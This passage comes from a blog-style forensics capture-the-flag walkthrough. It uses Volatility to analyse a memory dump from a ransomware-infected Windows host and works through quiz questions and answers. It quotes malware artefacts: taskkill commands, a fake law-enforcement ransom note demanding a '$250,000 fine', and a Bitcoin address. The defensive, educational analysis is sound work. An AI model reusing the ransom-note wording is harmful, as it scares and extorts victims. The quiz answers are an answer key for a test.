2.12.0</span><br><span class="line">Progress:  100.00PDB scanning finished                        </span><br><span class="line">PIDPPIDImageFileNameOffset(V)ThreadsHandlesSessionIdWow64CreateTimeExitTimeFile output</span><br><span class="line"></span><br><span class="line">40System0xbd0c6faff040161-N/AFalse2025-01-03 21:06:17.000000 UTCN/ADisabled</span><br><span class="line">1044Registry0xbd0c6fb1a0804-N/AFalse2025-01-03 21:06:15.000000 UTCN/ADisabled</span><br><span class="line">4404smss.exe0xbd0c709560802-N/AFalse2025-01-03 21:06:17.000000 UTCN/ADisabled</span><br><span class="line">568560csrss.exe0xbd0c74c9614011-0False2025-01-03 21:06:20.000000 UTCN/ADisabled</span><br><span class="line">640560wininit.exe0xbd0c74d680804-0False2025-01-03 21:06:20.000000 UTCN/ADisabled</span><br><span class="line">660632csrss.exe0xbd0c74d7108014-1False2025-01-03 21:06:20.000000 UTCN/ADisabled</span><br><span class="line">740632winlogon.exe0xbd0c74df70805-1False2025-01-03 21:06:20.000000 UTCN/ADisabled</span><br><span class="line">784640services.exe0xbd0c74da21c06-0False2025-01-03 21:06:20.000000 UTCN/ADisabled</span><br><span class="line">812640lsass.exe0xbd0c74dbe1808-0False2025-01-03 21:06:20.000000 UTCN/ADisabled</span><br><span class="line">936784svchost.exe0xbd0c74e5008019-0False2025-01-03 21:06:20.000000 UTCN/ADisabled</span><br><span class="line">964640fontdrvhost.ex0xbd0c74e5d0c06-0False2025-01-03 21:06:20.000000 UTCN/ADisabled</span><br><span class="line">1072784svchost.exe0xbd0c74f900c04-0False2025-01-03 21:06:20.000000 UTCN/ADisabled</span><br><span class="line">1364740LogonUI.exe0xbd0c7500a1c00-1False2025-01-03 21:06:20.000000 UTC2025-01-03 21:06:28.000000 UTCDisabled</span><br><span class="line">1372740dwm.exe0xbd0c7507514019-1False2025-01-03 21:06:20.000000 UTCN/ADisabled</span><br><span class="line">1440784svchost.exe0xbd0c750c90804-0False2025-01-03 21:06:20.000000 UTCN/ADisabled</span><br><span class="line">1516784VBoxService.ex0xbd0c751230c012-0False2025-01-03 21:06:21.000000 UTCN/ADisabled</span><br><span class="line">19684MemCompression0xbd0c7527604062-N/AFalse2025-01-03 21:06:21.000000 UTCN/ADisabled</span><br><span class="line">3092784MpDefenderCore0xbd0c758cd0c07-0False2025-01-03 21:06:21.000000 UTCN/ADisabled</span><br><span class="line">3156784sqlwriter.exe0xbd0c759660803-0False2025-01-03 21:06:21.000000 UTCN/ADisabled</span><br><span class="line">3264784wlms.exe0xbd0c75acc0803-0False2025-01-03 21:06:21.000000 UTCN/ADisabled</span><br><span class="line">3284784svchost.exe0xbd0c75aee0806-0False2025-01-03 21:06:21.000000 UTCN/ADisabled</span><br><span class="line">3292784MsMpEng.exe0xbd0c75aaa08010-0False2025-01-03 21:06:21.000000 UTCN/ADisabled</span><br><span class="line">3420784svchost.exe0xbd0c75b660804-0False2025-01-03 21:06:21.000000 UTCN/ADisabled</span><br><span class="line">3772784sppsvc.exe0xbd0c75e450c04-0False2025-01-03 21:06:21.000000 UTCN/ADisabled</span><br><span class="line">464    2720 AggregatorHost0xbd0c760620803-0False2025-01-03 21:06:22.000000 UTCN/ADisabled</span><br><span class="line">46282028 sihost.exe0xbd0c7492d08017-1False2025-01-03 21:06:25.000000 UTCN/ADisabled</span><br><span class="line">42681636taskhostw.exe0xbd0c762d10809-1False2025-01-03 21:06:25.000000 UTCN/ADisabled</span><br><span class="line">5200740userinit.exe0xbd0c762cd0800-1False2025-01-03 21:06:26.000000 UTC2025-01-03 21:06:49.000000 UTCDisabled</span><br><span class="line">53125200explorer.exe0xbd0c74b2d08082-1False2025-01-03 21:06:26.000000 UTCN/ADisabled</span><br><span class="line">5940936SearchHost.exe0xbd0c766fb08065-1False2025-01-03 21:06:26.000000 UTCN/ADisabled</span><br><span class="line">5948936StartMenuExper0xbd0c766fa08012-1False2025-01-03 21:06:26.000000 UTCN/ADisabled</span><br><span class="line">5964936Widgets.exe0xbd0c766f908025-1False2025-01-03 21:06:26.000000 UTCN/ADisabled</span><br><span class="line">6436936WidgetService.0xbd0c766f208010-1False2025-01-03 21:06:27.000000 UTCN/ADisabled</span><br><span class="line">6712936dllhost.exe0xbd0c766f00808-1False2025-01-03 21:06:27.000000 UTCN/ADisabled</span><br><span class="line">6948784svchost.exe0xbd0c766ef0805-0False2025-01-03 21:06:27.000000 UTCN/ADisabled</span><br><span class="line">7048936SppExtComObj.E0xbd0c766ea0802-0False2025-01-03 21:06:27.000000 UTCN/ADisabled</span><br><span class="line">72482504ctfmon.exe0xbd0c76cf108015-1False2025-01-03 21:06:28.000000 UTCN/ADisabled</span><br><span class="line">7276784svchost.exe0xbd0c7823e0806-0False2025-01-03 21:06:28.000000 UTCN/ADisabled</span><br><span class="line">7576784SearchIndexer.0xbd0c7820808011-0False2025-01-03 21:06:28.000000 UTCN/ADisabled</span><br><span class="line">7832936smartscreen.ex0xbd0c767750804-1False2025-01-03 21:06:29.000000 UTCN/ADisabled</span><br><span class="line">78685312SecurityHealth0xbd0c783580802-1False2025-01-03 21:06:29.000000 UTCN/ADisabled</span><br><span class="line">7888784 SecurityHealth0xbd0c767020c012-0False2025-01-03 21:06:29.000000 UTCN/ADisabled</span><br><span class="line">79885312VBoxTray.exe0xbd0c7827408013-1False2025-01-03 21:06:30.000000 UTCN/ADisabled</span><br><span class="line">71925312OneDrive.exe0xbd0c76bd808026-1False2025-01-03 21:06:30.000000 UTCN/ADisabled</span><br><span class="line">50485312msedge.exe0xbd0c782930c047-1False2025-01-03 21:06:32.000000 UTCN/ADisabled</span><br><span class="line">91124628msteams_autost0xbd0c772a30800-1False2025-01-03 21:06:35.000000 UTC2025-01-03 21:06:37.000000 UTCDisabled</span><br><span class="line">92049112msteams.exe0xbd0c774f208031-1False2025-01-03 21:06:36.000000 UTCN/ADisabled</span><br><span class="line">6660936RuntimeBroker.0xbd0c7754a0803-1False2025-01-03 21:06:37.000000 UTCN/ADisabled</span><br><span class="line">9560936WindowsTermina0xbd0c778600800-1False2025-01-03 21:06:39.000000 UTC2025-01-03 21:06:40.000000 UTCDisabled</span><br><span class="line">9420936FileCoAuth.exe0xbd0c776a00c04-1False2025-01-03 21:06:45.000000 UTCN/ADisabled</span><br><span class="line">98485312Wireshark.exe0xbd0c776760c010-1False2025-01-03 21:06:49.000000 UTCN/ADisabled</span><br><span class="line">86761636MicrosoftEdgeU0xbd0c74c680c03-0True2025-01-03 21:07:13.000000 UTCN/ADisabled</span><br><span class="line">748    1636taskhostw.exe0xbd0c76d460c03-1False2025-01-03 21:07:26.000000 UTCN/ADisabled</span><br><span class="line">8940784svchost.exe0xbd0c779170c07-0False2025-01-03 21:07:37.000000 UTCN/ADisabled</span><br><span class="line">64444680MEMYUoYU.exe0xbd0c779c70809-1True2025-01-03 21:07:47.000000 UTCN/ADisabled</span><br><span class="line">12364680ceIcEMkw.exe0xbd0c750ec08011-1True2025-01-03 21:07:47.000000 UTCN/ADisabled</span><br><span class="line">2240784    lmIcgUEQ.exe0xbd0c750080803-0True2025-01-03 21:07:47.000000 UTCN/ADisabled</span><br><span class="line">27641236ceIcEMkw.exe0xbd0c77b550800-1True2025-01-03 21:07:48.000000 UTC2025-01-03 21:07:49.000000 UTCDisabled</span><br><span class="line">69806444MEMYUoYU.exe0xbd0c774aa0800-1True2025-01-03 21:07:48.000000 UTC2025-01-03 21:07:49.000000 UTCDisabled</span><br><span class="line">67522240lmIcgUEQ.exe0xbd0c74bd40800-0True2025-01-03 21:07:48.000000 UTC2025-01-03 21:07:49.000000 UTCDisabled</span><br><span class="line">7840784VSSVC.exe0xbd0c778450802-0False2025-01-03 21:07:50.000000 UTCN/ADisabled</span><br><span class="line">1624936WmiPrvSE.exe0xbd0c70cb10c09-0False2025-01-03 21:08:06.000000 UTCN/ADisabled</span><br><span class="line">9744936backgroundTask0xbd0c78f9308027-1False2025-01-03 21:08:09.000000 UTCN/ADisabled</span><br><span class="line">21287576SearchFilterHo0xbd0c778550c04-0False2025-01-03 21:10:10.000000 UTCN/ADisabled</span><br><span class="line">9460936WmiPrvSE.exe0xbd0c75a9b0c06-0False2025-01-03 21:10:20.000000 UTCN/ADisabled</span><br><span class="line">9276936RuntimeBroker.0xbd0c7b0230c018-1False2025-01-03 21:10:27.000000 UTCN/ADisabled</span><br><span class="line">680    7724 msedgewebview20xbd0c789e70c017-1False2025-01-03 21:11:27.000000 UTCN/ADisabled</span><br><span class="line">2228936ShellExperienc0xbd0c706020c00-1False2025-01-03 21:11:57.000000 UTC2025-01-03 21:11:58.000000 UTCDisabled</span><br></pre></td></tr></table></figure><p>The desired PID is <code>2240</code>.</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">What is the PID of the process found in the evtx analysis?</span><br><span class="line">2240</span><br><span class="line">Correct!</span><br><span class="line">Which IP does not compare in the given pcap file?</span><br></pre></td></tr></table></figure><p>Step 2: Identifying the IP Not Found in the PCAP File</p><p>To answer this, I extracted all IPs from both the memory and PCAP file and identified the unique one:</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">IPs in memory but not in PCAP:</span></span><br><span class="line">&#123;<span class="string">&#x27;52.123.129.254&#x27;</span>, <span class="string">&#x27;104.208.16.90&#x27;</span>, <span class="string">&#x27;13.107.18.254&#x27;</span>, <span class="string">&#x27;20.54.37.73&#x27;</span>, </span><br><span class="line"><span class="string">&#x27;0.0.0.0&#x27;</span>, <span class="string">&#x27;102.133.96.237&#x27;</span>, <span class="string">&#x27;13.89.179.12&#x27;</span>, <span class="string">&#x27;204.79.197.222&#x27;</span>, </span><br><span class="line"><span class="string">&#x27;79.140.81.80&#x27;</span>, <span class="string">&#x27;13.107.42.16&#x27;</span>, <span class="string">&#x27;13.107.4.254&#x27;</span>, <span class="string">&#x27;127.0.0.1&#x27;</span>, </span><br><span class="line"><span class="string">&#x27;20.42.65.84&#x27;</span>, <span class="string">&#x27;13.107.42.254&#x27;</span>, <span class="string">&#x27;2.18.40.141&#x27;</span>, <span class="string">&#x27;150.171.31.254&#x27;</span>&#125;</span><br></pre></td></tr></table></figure><p><code>127.0.0.1</code> found to be the desired one.</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Which IP does not compare in the given pcap file?</span><br><span class="line">127.0.0.1</span><br><span class="line">Correct!</span><br><span class="line">What is the name in the manifest of the chrome extension found in the pcap and not in the RAM?</span><br></pre></td></tr></table></figure><p>Step 3: Identifying the Chrome Extension in PCAP but Not in RAM</p><p>I first extracted all manifest.json files from Chrome extensions in RAM:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">$ python3 vol.py -f capture_ram.elf windows.filescan | grep -i chrome</span><br><span class="line">.</span><br><span class="line">0xbd0c75f09cc0  \Windows\SystemTemp\chrome_Unpacker_BeginUnzipping5048_445653246\manifest.json</span><br><span class="line">0xbd0c7882e420\Windows\SystemTemp\chrome_Unpacker_BeginUnzipping5048_1057753398\manifest.json</span><br><span class="line">0xbd0c78954860\Windows\SystemTemp\chrome_Unpacker_BeginUnzipping5048_1118485891\manifest.json</span><br><span class="line">0xbd0c78bce6d0\Windows\SystemTemp\chrome_Unpacker_BeginUnzipping5048_2106172079\manifest.json</span><br><span class="line">0xbd0c78c44e00\Windows\SystemTemp\chrome_Unpacker_BeginUnzipping6680_1326467458\manifest.json</span><br><span class="line">0xbd0c78c6c9f0\Windows\SystemTemp\chrome_Unpacker_BeginUnzipping5048_1390318324\manifest.json</span><br><span class="line">0xbd0c78f2e420\Windows\SystemTemp\chrome_Unpacker_BeginUnzipping5048_194502111\manifest.json</span><br><span class="line">0xbd0c78f36da0\Windows\SystemTemp\chrome_Unpacker_BeginUnzipping5048_237055600\manifest.json</span><br><span class="line">0xbd0c7b137af0\Windows\SystemTemp\chrome_Unpacker_BeginUnzipping5048_1258389728\manifest.json</span><br><span class="line">0xbd0c7b137e10\Windows\SystemTemp\chrome_Unpacker_BeginUnzipping5048_1536421050\manifest.json</span><br><span class="line">0xbd0c7b16f400\Windows\SystemTemp\chrome_Unpacker_BeginUnzipping5048_957693503\manifest.json</span><br><span class="line">0xbd0c7b16fef0\Windows\SystemTemp\chrome_Unpacker_BeginUnzipping5048_81652069\manifest.json</span><br><span class="line"></span><br><span class="line">$ python3 vol.py -f capture_ram.elf windows.dumpfiles --virtaddr 0xbd0c75f09cc0</span><br><span class="line">Volatility 3 Framework 2.12.0</span><br><span class="line">Progress:  100.00PDB scanning finished                        </span><br><span class="line">CacheFileObjectFileNameResult</span><br><span class="line"></span><br><span class="line">DataSectionObject0xbd0c75f09cc0manifest.jsonfile.0xbd0c75f09cc0.0xbd0c7421f970.DataSectionObject.manifest.json.dat</span><br></pre></td></tr></table></figure><p>Repeat the above step, and the .dat file you get is the manifest.json of the Chrome extension. Then, I went on checking the Chrome extension files we extracted from the PCAPng.</p><p>After unzipping the Chrome extension file, you will find the manifest.json:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$ unzip <span class="string">&#x27;2ed1297e-f6c9-4355-aec4-433ea371b116%3fP1=1736221556&amp;P2=404&amp;P3=2&amp;P4=Zn4z6sl51sScnVeur31nZxcyJTY5mx4dMJFWB25fpo6vQYirZGtNOe3OY4cWH5eTHVKrEWtal87QWFUtShW2hg%3d%3d&#x27;</span></span><br><span class="line">$ <span class="built_in">cat</span> manifest.json </span><br><span class="line">&#123;</span><br><span class="line">    <span class="string">&quot;description&quot;</span>:  <span class="string">&quot;AutofillCore data component&quot;</span>,</span><br><span class="line">    <span class="string">&quot;name&quot;</span>:  <span class="string">&quot;AutofillCore&quot;</span>,</span><br><span class="line">    <span class="string">&quot;version&quot;</span>:  <span class="string">&quot;4.0.1.10&quot;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>The above chrome extension was not present in the RAM.</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">What is the name in the manifest of the chrome extension found in the pcap and not in the RAM?</span><br><span class="line">AutofillCore</span><br><span class="line">Correct!</span><br><span class="line">Give the PID of the displayed suspicious processes (do not consider does already analysed, neither their sons). If more than one put a comma (e.g. 1, 2)</span><br></pre></td></tr></table></figure><p>Step 4: Finding Suspicious Processes</p><p>By reviewing the pslist output, the suspicious processes found were MEMYUoYU.exe (PID 6444), ceIcEMkw.exe (PID 1236)</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Give the PID of the displayed suspicious processes (do not consider does already analysed, neither their sons). If more than one put a comma (e.g. 1, 2)</span><br><span class="line">6444, 1236</span><br><span class="line">Correct!</span><br><span class="line">What is the directory of the file related to process 6444? Give the complete path from the root directory to the extension. (e.g. C:\path\my\process.extension)</span><br></pre></td></tr></table></figure><p>Step 5: Finding the Directory of the Malicious Processes</p><p>Using filescan, I determined the file locations:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ python3 vol.py -f ~/Downloads/capture_ram.elf windows.filescan | grep -i <span class="string">&quot;MEMYUoYU.exe&quot;</span></span><br><span class="line">0xbd0c78960250 \Users\User\kOIUsMQU\MEMYUoYU.exe</span><br></pre></td></tr></table></figure><p>Let’s submit the output in the specified format:</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">What is the directory of the file related to process 6444? Give the complete path from the root directory to the extension. (e.g. C:\path\my\process.extension)C:\Users\User\kOIUsMQU\MEMYUoYU.exe</span><br><span class="line">Correct!</span><br><span class="line">What is the directory of the file related to process 1236? Give the complete path from the root directory to the extension. (e.g. C:\path\my\process.extension)</span><br></pre></td></tr></table></figure><p>Step 6: Finding the Directory of Another Malicious Process</p><p>I am not sure why the author wanted us to repeat the same step again, but let’s proceed.</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">What is the directory of the file related to process 1236? Give the complete path from the root directory to the extension. (e.g. C:\path\my\process.extension)C:\ProgramData\hwQkYMwk\ceIcEMkw.exe</span><br><span class="line">Correct!</span><br><span class="line">What is the parent PID of the malicious processes?</span><br></pre></td></tr></table></figure><p>Step 7: Identifying the Parent PID of Malicious Processes</p><p>By checking the PPID of these processes, I found:<br>Parent PID: 4680</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">What is the parent PID of the malicious processes?</span><br><span class="line">4680</span><br><span class="line">Correct!</span><br><span class="line">How many files have been encrypted?</span><br></pre></td></tr></table></figure><p>Step 8: Finding the number of encrypted files</p><p>To determine this, I first searched for keywords like crypt in the windows.filescan output of Volatility but didn’t find any significant leads. Since malware was involved, I then tried the windows.malfind plugin, which revealed some useful information:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">$ python3 vol.py -f ~/Downloads/capture_ram.elf windows.malfind</span><br><span class="line">Volatility 3 Framework 2.12.0</span><br><span class="line">Progress:  100.00PDB scanning finished                        </span><br><span class="line">PIDProcessStart VPNEnd VPNTagProtectionCommitChargePrivateMemoryFile outputNotesHexdumpDisasm</span><br><span class="line">6444MEMYUoYU.exe0x50900000x5090fffVadSPAGE_EXECUTE_READWRITE11DisabledN/A</span><br><span class="line">6e 6f 74 65 70 61 64 2e 65 78 65 20 22 43 3a 5c notepad.exe <span class="string">&quot;C:\</span></span><br><span class="line"><span class="string">50 72 6f 67 72 61 6d 44 61 74 61 5c 5a 63 67 55 ProgramData\ZcgU</span></span><br><span class="line"><span class="string">2e 74 78 74 22 00 00 00 00 00 00 00 00 00 00 00 .txt&quot;</span>...........</span><br><span class="line">00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................</span><br><span class="line"></span><br><span class="line">1236ceIcEMkw.exe0x52c00000x52c0fffVadSPAGE_EXECUTE_READWRITE11DisabledN/A</span><br><span class="line">74 61 73 6b 6b 69 6c 6c 20 2f 46 49 20 22 55 53 taskkill /FI <span class="string">&quot;US</span></span><br><span class="line"><span class="string">45 52 4e 41 4d 45 20 65 71 20 55 73 65 72 22 20 ERNAME eq User&quot;</span> </span><br><span class="line">2f 46 20 2f 49 4d 20 4d 45 4d 59 55 6f 59 55 2e /F /IM MEMYUoYU.</span><br><span class="line">65 78 65 00 00 00 00 00 00 00 00 00 00 00 00 00 exe.............</span><br><span class="line"></span><br><span class="line">1236ceIcEMkw.exe0x52d00000x52d0fffVadSPAGE_EXECUTE_READWRITE11DisabledN/A</span><br><span class="line">74 61 73 6b 6b 69 6c 6c 20 2f 46 49 20 22 55 53 taskkill /FI <span class="string">&quot;US</span></span><br><span class="line"><span class="string">45 52 4e 41 4d 45 20 65 71 20 55 73 65 72 22 20 ERNAME eq User&quot;</span> </span><br><span class="line">2f 46 20 2f 49 4d 20 63 65 49 63 45 4d 6b 77 2e /F /IM ceIcEMkw.</span><br><span class="line">65 78 65 00 00 00 00 00 00 00 00 00 00 00 00 00 exe.............</span><br><span class="line"></span><br><span class="line">1236ceIcEMkw.exe0xaad00000xab48fffVadSPAGE_EXECUTE_READWRITE1211DisabledN/A</span><br><span class="line">f4 00 00 00 55 6e 69 74 65 64 20 53 74 61 74 65 ....United State</span><br><span class="line">73 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 s...............</span><br><span class="line">00 00 00 00 42 69 74 41 63 63 65 73 73 20 42 69 ....BitAccess Bi</span><br><span class="line">74 63 6f 69 6e 20 41 54 4d 20 6d 61 63 68 69 6e tcoin ATM machin</span><br><span class="line"></span><br><span class="line">1236ceIcEMkw.exe0x9b00000x9b0fffVadSPAGE_EXECUTE_READWRITE11DisabledN/A</span><br><span class="line">47 45 54 20 2f 6d 61 70 73 2f 61 70 69 2f 73 74 GET /maps/api/st</span><br><span class="line">61 74 69 63 6d 61 70 3f 63 65 6e 74 65 72 3d 33 aticmap?center=3</span><br><span class="line">32 2e 33 33 35 39 37 35 35 30 2c 2d 31 31 31 2e 2.33597550,-111.</span><br><span class="line">30 34 34 31 30 31 31 30 26 7a 6f 6f 6d 3d 31 34 04410110&amp;zoom=14</span><br></pre></td></tr></table></figure><p>Following this, I searched for the file in filescan, retrieved the virtual address, and dumped the file using the windows.dumpfiles plugin. Upon checking its contents, I found a list of 288 encrypted files.</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">How many files have been encrypted?</span><br><span class="line">288</span><br><span class="line">Correct!</span><br><span class="line">Give the filename of the file containing the list of the files to be encrypted. (only the filename not the whole path).</span><br></pre></td></tr></table></figure><p>Step 9: Identifying the filename containing the list</p><p>I know it is ZcgU.txt</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Give the filename of the file containing the list of the files to be encrypted. (only the filename not the whole path).</span><br><span class="line">ZcgU.txt</span><br><span class="line">Correct!</span><br><span class="line">Which cryptocurrency is used?</span><br></pre></td></tr></table></figure><p>Step 10: Finding the cryptocurrency</p><p>The malfind output above shows that Bitcoin was used.</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Which cryptocurrency is used?</span><br><span class="line">Bitcoin</span><br><span class="line">Correct!</span><br><span class="line">Which GET request is not present in the pcap? Give the whole request (METHOD resource, e.g. POST /accessed/resource)</span><br></pre></td></tr></table></figure><p>Step 11: Identifying the GET Request</p><p>To answer this, I searched for GET requests in the memory file. I compared them which were looking similar to those in the PCAP but found no match. However, I had also discovered a GET request during the malfind search, which turned out to be the missing one:</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Which GET request is not present in the pcap? Give the whole request (METHOD resource, e.g. POST /accessed/resource)</span><br><span class="line">GET /maps/api/staticmap?center=32.33597550,-111.04410110&amp;zoom=14</span><br><span class="line">Correct!</span><br><span class="line">Why did you have to pay a fine?</span><br></pre></td></tr></table></figure><p>Step 12: Finding the reason for the fine</p><p>The question was a bit confusing, so I explored various Volatility plugins. Eventually, I dumped the memory of the malware process MEMYUoYU.exe and searched for related strings:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ python3 vol.py -f ~/Downloads/capture_ram.elf windows.memmap --pid 6444 --dump</span><br><span class="line"></span><br><span class="line">$ strings -el pid.6444.dmp | grep -iC5  <span class="string">&quot;pay a fine&quot;</span></span><br></pre></td></tr></table></figure><p>This revealed the following text:</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">imits:P</span><br><span class="line">All locationsQ</span><br><span class="line">Fine Amount:R</span><br><span class="line">$Total Amount Paid:S</span><br><span class="line">D*Multiple transfers are permitted.</span><br><span class="line">BThere are two ways to pay a fine:</span><br><span class="line">Unauthorized or pirated software has been detected. This computer has been blocked under the authority of 17 U.S.C s.506</span><br><span class="line">An attempt to access an extremist directory containing Fundamental Islam materials has been detected.</span><br><span class="line">Willful copyright infringement is a federal crime that carries penalties of up to five years in federal prison, a $250,000 fine, forfeiture and restitution (17 U.S.C s.506, 18 U.S.C s.2319)</span><br><span class="line">Willful possession of extremist materials is a federal crime that carries penalties of up to fifteen years in federal prison, a $250,000 fine, forfeiture and restitution (18 U.S.C s.2339A)</span><br><span class="line">Your system has been compromised by extremists. Under the authority of 18 U.S.C s.2339A this computer has been blocked.</span><br><span class="line">You are guilty of Computer Neglect. As a first-time offender you are required by law to pay a fine. Fine Amount: </span><br><span class="line">As a first-time offender you are required by law to pay a fine of</span><br><span class="line">If the fine is not paid within three days, a warrant will be issued for your arrest, which will be forwarded to your local authorities. You will be charged, fined, convicted for up to 5 years.</span><br></pre></td></tr></table></figure><p>Thus, the answer is “unauthorized or pirated software”.</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Why did you have to pay a fine?</span><br><span class="line">unauthorized or pirated software</span><br><span class="line">Correct!</span><br><span class="line">What is the amount of fine? (e.g. €10,000)</span><br></pre></td></tr></table></figure><p>Step 13: Findint the amount of fine</p><p>From the extracted text, the fine amount is clearly stated as $250,000.</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">What is the amount of fine? (e.g. €10,000)</span><br><span class="line">$250,000</span><br><span class="line">Correct!</span><br><span class="line">Which forum is used to ask for BitCoin AMT?</span><br></pre></td></tr></table></figure><p>Step 14: Searching for the forum</p><p>Searching in PID 6444 didn’t provide an answer, so I checked the memory dump of PID 1236. By analysing it with strings command, I can find some questions on reddit.com site.</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Which forum is used to ask for BitCoin AMT?</span><br><span class="line">reddit</span><br><span class="line">Correct!</span><br><span class="line">What is the BitCoin address at charts01.bitcoincharts.com?</span><br></pre></td></tr></table></figure><p>Step 15: Finding the BitCoin address</p><p>To find the address, I searched for charts01.bitcoincharts.com.</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ strings -el pid.1236.dmp | grep -iC5 <span class="string">&quot;charts01.bitcoincharts.com&quot;</span></span><br></pre></td></tr></table></figure><p>I got the address as <code>1yQBzAaZx7FojqMmTtHPTfZ42T4t6Q1Uh</code>.</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">What is the BitCoin address at charts01.bitcoincharts.com?</span><br><span class="line">1yQBzAaZx7FojqMmTtHPTfZ42T4t6Q1Uh</span><br><span class="line">Correct!</span><br><span class="line">From which directory does process 6444 come from? Give only the local path with directory name (NOT the absolute path, i.e. without Desktop, e.g. mydirectory)</span><br></pre></td></tr></table></figure><p>Step 16: Identifying the directory</p><p>If I search with the help of strings and grep the <code>\Desktop\</code> , you can found multiple references to <code>\Users\User\Desktop\ch2\</code> as shown below:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$ strings -el pid.6444.dmp | grep -i <span class="string">&quot;\\\DESKTOP&quot;</span> </span><br><span class="line">C:\Users\User\Desktop\ch2\0002bdf0923262600d3ef66d1ec6b2396a434e6f7626a9d70241a5663ee2f736.exe</span><br><span class="line">C:\Users\User\Desktop\ch2\</span><br><span class="line">C:\Users\User\Desktop\ch2\</span><br><span class="line">C:\Users\User\Desktop\ch2\</span><br><span class="line">.</span><br></pre></td></tr></table></figure><p>Secondly I can also get the same directory with the help of windows.handles 